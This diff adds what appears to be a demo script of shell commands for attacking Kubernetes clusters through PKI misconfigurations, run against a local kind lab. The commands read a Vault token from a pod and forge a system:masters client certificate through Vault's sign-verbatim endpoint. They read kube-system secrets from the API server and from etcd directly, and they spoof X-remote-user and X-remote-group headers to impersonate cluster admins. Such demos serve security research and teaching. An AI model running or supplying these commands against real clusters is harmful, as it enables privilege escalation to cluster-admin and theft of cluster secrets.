@@ -1,0 +1,86 @@
+#####
+# PKI access control
+
+KUBECONFIG=k8s-client.kubeconfig kubectl exec -it webserver -- bash
+
+cat /etc/nginx/sites-enabled/default
+
+openssl x509 -noout -text -in /etc/ssl/certs/webserver.pem | grep -e "Subject:" -e "Issuer:"
+
+cat /root/.vault-token
+
+cat > pwn.cnf <<EOF
+[ req ]
+default_bits = 2048
+default_md = sha256
+prompt = no
+encrypt_key = no
+distinguished_name = dn
+[ dn ]
+O = system:masters
+CN = goose
+EOF
+
+openssl req -new -config "pwn.cnf" -keyout "pwn.key" -out "pwn.csr"
+
+json=$(VAULT_FORMAT=json vault write pki/k8s-pki/sign-verbatim csr=@"pwn.csr" ttl=24h)
+
+echo "${json}" | jq -r '.["data"]["certificate"],.["data"]["ca_chain"][]' > "pwn.crt"
+
+openssl x509 -noout -text -in pwn.crt | grep -e "Subject:" -e "Issuer:"
+
+curl -s -k --cert pwn.crt --key pwn.key https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets | jq '.["items"][]["metadata"]["name"]' | head -5
+
+
+#####
+#etcd Shared:
+
+openssl x509 -noout -text -in k8s-client.crt | grep -e "Subject:" -e "Issuer:"
+
+etcdctl --cacert=kubernetes/pki/ca.crt --cert=k8s-client.crt --key=k8s-client.key --endpoints=172.18.0.2:2379 --insecure-skip-tls-verify get --prefix=true "/registry/secrets/kube-system" --keys-only=true | head -5
+
+curl -s -k --cert k8s-client.crt --key k8s-client.key https://172.18.0.2:2379/v3/kv/range -X POST -d "{\"key\": \"$(echo -n '/registry/secrets/kube-system' | base64)\", \"range_end\": \"$(echo -n '/registry/secrets/kube-systen' | base64)\"}" | jq '.["kvs"][]["key"] | @base64d' | head -5
+
+alias ectl="etcdctl --cacert=kubernetes/pki/ca.crt --cert=kubernetes/pki/apiserver-etcd-client.crt --key=kubernetes/pki/apiserver-etcd-client.key --endpoints=172.18.0.2:2379 --insecure-skip-tls-verify"
+
+ectl user add root --no-password=true
+ectl user grant-role root root
+ectl user add kube-apiserver-etcd-client --no-password=true
+ectl user grant-role kube-apiserver-etcd-client root
+ectl auth enable
+
+etcdctl --cacert=kubernetes/pki/ca.crt --cert=k8s-client.crt --key=k8s-client.key --endpoints=172.18.0.2:2379 --insecure-skip-tls-verify get --prefix=true "/registry/secrets/kube-system" --keys-only=true
+
+ectl auth disable
+
+#####
+#requestheader-allowed-names:
+
+PORT=`docker inspect  kind-${KINDID}-control-plane | sed -n 's/^.*"HostPort": "\([0-9][0-9]*\)".*$/\1/p' | head -1`
+
+curl -s -k --cert k8s-client.crt --key k8s-client.key https://127.0.0.1:${PORT}/api/v1/namespaces/kube-system/secrets
+
+curl -s -k --cert k8s-client.crt --key k8s-client.key -H "X-remote-user: goose" -H "X-remote-group: system:masters" https://127.0.0.1:${PORT}/api/v1/namespaces/kube-system/secrets | jq '.["items"][]["metadata"]["name"]' | head -5
+
+#####
+# improper chaining
+
+# cross-cluster kubeconfig
+
+cat k8s-client.kubeconfig | sed -n 's/^.*client-certificate-data: //p' | base64 -d | openssl x509 -noout -text | grep -e Subject: -e Issuer:
+
+cat nonprod-k8s-admin.kubeconfig | sed -n 's/^.*client-certificate-data: //p' | base64 -d | openssl x509 -noout -text | grep -e Subject: -e Issuer:
+
+KUBECONFIG=nonprod-k8s-admin.kubeconfig kubectl get secrets -n kube-system | head -5
+
+# missing requestheader-allowed-names
+
+KUBECONFIG=k8s-client.kubeconfig kubectl exec -it webserver -- bash
+
+cat /etc/nginx/sites-enabled/default
+curl -s -k --cert /etc/ssl/certs/webserver.pem --key /etc/ssl/private/webserver.key https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets
+
+curl -s -k -H "X-remote-user: goose" -H "X-remote-group: system:masters" --cert /etc/ssl/certs/webserver.pem --key /etc/ssl/private/webserver.key https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets | jq '.["items"][]["metadata"]["name"]' | head -5
+
+# etcd
+curl -s -k --cert /etc/ssl/certs/webserver.pem --key /etc/ssl/private/webserver.key https://172.18.0.2:2379/v3/kv/range -X POST -d "{\"key\": \"$(echo -n '/registry/secrets/kube-system' | base64)\", \"range_end\": \"$(echo -n '/registry/secrets/kube-systen' | base64)\"}" | jq '.["kvs"][]["key"] | @base64d' | head -5
